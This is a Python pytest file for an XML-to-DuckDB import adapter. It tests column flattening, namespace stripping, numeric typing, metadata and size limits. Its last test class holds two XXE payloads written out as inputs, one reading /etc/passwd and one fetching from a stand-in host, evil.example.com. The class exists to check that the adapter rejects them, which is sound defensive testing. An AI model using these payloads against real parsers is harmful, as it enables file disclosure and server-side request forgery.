"""Tests for XML data source adapter."""

import duckdb
import pytest

from src.mcp.data_source.adapters.xml_adapter import XMLAdapter


@pytest.fixture()
def conn():
    c = duckdb.connect(":memory:")
    yield c
    c.close()


@pytest.fixture()
def xml_file(tmp_path):
    def _create(content: str, name: str = "data.xml") -> str:
        p = tmp_path / name
        p.write_text(content)
        return str(p)
    return _create


SIMPLE_XML = """\
<?xml version="1.0"?>
<Orders>
  <Order>
    <OrderID>123</OrderID>
    <ShipTo>
      <Name>John Doe</Name>
      <City>Dallas</City>
    </ShipTo>
  </Order>
  <Order>
    <OrderID>456</OrderID>
    <ShipTo>
      <Name>Jane Smith</Name>
      <City>Austin</City>
    </ShipTo>
  </Order>
</Orders>
"""


class TestXMLAdapter:
    def test_source_type(self):
        assert XMLAdapter().source_type == "xml"

    def test_simple_xml(self, conn, xml_file):
        path = xml_file(SIMPLE_XML)
        adapter = XMLAdapter()
        result = adapter.import_data(conn, file_path=path)
        assert result.row_count == 2
        col_names = [c.name for c in result.columns]
        assert "OrderID" in col_names
        assert "ShipTo_Name" in col_names
        assert "ShipTo_City" in col_names

    def test_explicit_record_path(self, conn, xml_file):
        path = xml_file(SIMPLE_XML)
        adapter = XMLAdapter()
        result = adapter.import_data(conn, file_path=path, record_path="Orders/Order")
        assert result.row_count == 2

    def test_namespace_stripped(self, conn, xml_file):
        xml = """\
<?xml version="1.0"?>
<ns0:Root xmlns:ns0="http://example.com">
  <ns0:Item><ns0:Name>Test</ns0:Name></ns0:Item>
</ns0:Root>
"""
        path = xml_file(xml)
        adapter = XMLAdapter()
        result = adapter.import_data(conn, file_path=path)
        col_names = [c.name for c in result.columns]
        # Namespace prefixes should be stripped
        assert all(not name.startswith("ns0") for name in col_names)

    def test_file_not_found(self, conn):
        adapter = XMLAdapter()
        with pytest.raises(FileNotFoundError):
            adapter.import_data(conn, file_path="/nonexistent.xml")

    def test_file_too_large(self, conn, tmp_path):
        """Files exceeding MAX_FILE_SIZE_BYTES are rejected."""
        path = tmp_path / "huge.xml"
        path.write_text("<Root>" + "<Item><Name>X</Name></Item>" * 50 + "</Root>")
        adapter = XMLAdapter()
        import src.mcp.data_source.adapters.xml_adapter as mod
        original = mod.MAX_FILE_SIZE_BYTES
        mod.MAX_FILE_SIZE_BYTES = 10  # 10 bytes
        try:
            with pytest.raises(ValueError, match="exceeds"):
                adapter.import_data(conn, file_path=str(path))
        finally:
            mod.MAX_FILE_SIZE_BYTES = original


class TestXMLAdapterNumericTypes:
    """Test that XML numeric values get correct DuckDB types."""

    def test_numeric_elements_become_numeric_types(self, conn, xml_file):
        """Numeric XML text content should produce BIGINT/DOUBLE columns."""
        xml = """\
<?xml version="1.0"?>
<Orders>
  <Order>
    <Name>Widget</Name>
    <Qty>10</Qty>
    <Weight>5.5</Weight>
    <Price>29.99</Price>
  </Order>
  <Order>
    <Name>Gadget</Name>
    <Qty>3</Qty>
    <Weight>12.0</Weight>
    <Price>149.00</Price>
  </Order>
</Orders>
"""
        path = xml_file(xml)
        adapter = XMLAdapter()
        result = adapter.import_data(conn, file_path=path)
        type_map = {c.name: c.type for c in result.columns}
        assert type_map["Name"] == "VARCHAR"
        assert type_map["Qty"] == "BIGINT"
        assert type_map["Weight"] == "DOUBLE"
        # Price has mixed int+float coercion (149.00 → float, 29.99 → float) → DOUBLE
        assert type_map["Price"] == "DOUBLE"

    def test_numeric_queries_work_without_cast(self, conn, xml_file):
        """SQL numeric comparisons on XML-sourced data should work without CAST."""
        xml = """\
<?xml version="1.0"?>
<Items>
  <Item><Name>Light</Name><Weight>5</Weight></Item>
  <Item><Name>Heavy</Name><Weight>25</Weight></Item>
  <Item><Name>Heavier</Name><Weight>50</Weight></Item>
</Items>
"""
        path = xml_file(xml)
        adapter = XMLAdapter()
        adapter.import_data(conn, file_path=path)
        rows = conn.execute(
            "SELECT Name FROM imported_data WHERE Weight > 20"
        ).fetchall()
        names = {r[0] for r in rows}
        assert names == {"Heavy", "Heavier"}

    def test_real_xml_file_numeric_types(self, conn):
        """Test against actual XML test data file."""
        from pathlib import Path

        xml_path = Path("test_data/shipments_orders.xml")
        if not xml_path.exists():
            pytest.skip("test_data/shipments_orders.xml not found")

        adapter = XMLAdapter()
        result = adapter.import_data(conn, file_path=str(xml_path))
        type_map = {c.name: c.type for c in result.columns}

        assert type_map["WeightLbs"] == "DOUBLE", f"WeightLbs should be DOUBLE, got {type_map['WeightLbs']}"
        assert type_map["DeclaredValue"] == "DOUBLE", f"DeclaredValue should be DOUBLE, got {type_map['DeclaredValue']}"
        assert type_map["RecipientName"] == "VARCHAR"

        # Numeric comparison must work
        rows = conn.execute(
            "SELECT COUNT(*) FROM imported_data WHERE WeightLbs > 20"
        ).fetchone()
        assert rows[0] > 0


class TestXMLAdapterMetadata:
    """Test get_metadata returns correct info."""

    def test_metadata_after_import(self, conn, xml_file):
        path = xml_file(SIMPLE_XML)
        adapter = XMLAdapter()
        adapter.import_data(conn, file_path=path)
        meta = adapter.get_metadata(conn)
        assert meta["row_count"] == 2
        assert meta["source_type"] == "xml"

    def test_metadata_before_import(self, conn):
        adapter = XMLAdapter()
        meta = adapter.get_metadata(conn)
        assert "error" in meta


class TestXMLAdapterXXEPrevention:
    """Tests for XXE injection prevention (CPB-1, CWE-611).

    Verifies that defusedxml.expatbuilder.defuse_stdlib() blocks
    external entity expansion and parameter entity attacks.
    """

    def test_xxe_entity_rejected(self, conn, xml_file):
        """XML with external entity declaration is rejected."""
        xxe_xml = (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo ['
            '  <!ENTITY xxe SYSTEM "file:///etc/passwd">'
            ']>'
            '<Root><Item><Name>&xxe;</Name></Item></Root>'
        )
        path = xml_file(xxe_xml)
        adapter = XMLAdapter()
        with pytest.raises(Exception):
            adapter.import_data(conn, file_path=path)

    def test_xxe_parameter_entity_rejected(self, conn, xml_file):
        """XML with parameter entity declaration is rejected."""
        xxe_xml = (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo ['
            '  <!ENTITY % pe SYSTEM "http://evil.example.com/payload">'
            '  %pe;'
            ']>'
            '<Root><Item><Name>test</Name></Item></Root>'
        )
        path = xml_file(xxe_xml)
        adapter = XMLAdapter()
        with pytest.raises(Exception):
            adapter.import_data(conn, file_path=path)

    def test_safe_xml_still_works(self, conn, xml_file):
        """Normal XML without entities still imports correctly."""
        safe_xml = (
            '<?xml version="1.0"?>'
            '<Root><Item><Name>Safe</Name><Value>123</Value></Item></Root>'
        )
        path = xml_file(safe_xml)
        adapter = XMLAdapter()
        result = adapter.import_data(conn, file_path=path)
        assert result.row_count == 1
